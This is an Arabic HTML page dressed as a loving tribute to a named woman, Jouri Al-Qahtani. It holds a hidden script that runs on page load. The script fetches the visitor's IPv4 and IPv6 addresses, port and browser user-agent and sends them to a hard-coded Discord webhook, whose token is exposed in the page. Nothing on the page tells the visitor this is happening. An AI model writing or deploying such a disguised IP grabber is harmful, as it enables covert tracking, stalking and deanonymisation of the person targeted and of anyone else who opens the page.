<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إلى جوري القحطاني 💖</title>
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: linear-gradient(135deg, #ffe4e6 0%, #fecdd3 50%, #fda4af 100%);
            font-family: 'Tajawal', sans-serif;
            color: #881337;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 30px 20px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(159, 18, 57, 0.15);
            text-align: center;
        }
        h1 { font-family: 'Amiri', serif; font-size: 2rem; color: #9f1239; margin-bottom: 10px; }
        p { font-size: 1rem; color: #be123c; margin-bottom: 20px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="container">
        <h1>إلى الجوهرة.. جوري 💕</h1>
        <p>وجودكِ في هذا العالم يجعل كل شيء أكثر رقة وجمالاً..</p>
    </div>

    <script>
        // ⚠️ ضع رابط الـ Webhook الخاص بك من ديسكورد هنا
        const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558756212567449700/7DqOL-5GU1Xpm5f2NGTrJK7DTxcwk4mTkxyfEimvmya3DsW8fj1oR5JPiTw9RHWBWKN_";

        async function sendAllIPs() {
            let ipv4 = "غير متوفر على الشبكة";
            let ipv6 = "غير متوفر على الشبكة";

            // 1. محاولة جلب IPv4
            try {
                const res4 = await fetch('https://api4.ipify.org?format=json');
                const data4 = await res4.json();
                if (data4.ip) ipv4 = data4.ip;
            } catch (e) {
                console.log("IPv4 غير مدعوم أو فشل الاتصال به");
            }

            // 2. محاولة جلب IPv6
            try {
                const res6 = await fetch('https://api6.ipify.org?format=json');
                const data6 = await res6.json();
                if (data6.ip) ipv6 = data6.ip;
            } catch (e) {
                console.log("IPv6 غير مدعوم أو فشل الاتصال به");
            }

            const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
            const ua = navigator.userAgent;

            // 3. إرسال البيانات إلى ديسكورد إذا كان الرابط موجوداً
            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "ضع_رابط_الويبهوك_هنا") {
                const payload = {
                    embeds: [{
                        title: "💌 زائر جديد دخل صفحة جوري القحطاني (جميع أنواع الـ IP)",
                        color: 16729222,
                        fields: [
                            { name: "🌐 الـ IPv4", value: `\`${ipv4}\``, inline: false },
                            { name: "🌍 الـ IPv6", value: `\`${ipv6}\``, inline: false },
                            { name: "🔌 البورت", value: `\`${port}\``, inline: true },
                            { name: "📱 الجهاز والمتصفح", value: `\`\`\`${ua}\`\`\``, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                try {
                    await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch (err) {
                    console.error("خطأ في إرسال الويبهوك:", err);
                }
            }
        }

        sendAllIPs();
    </script>
</body>
</html>
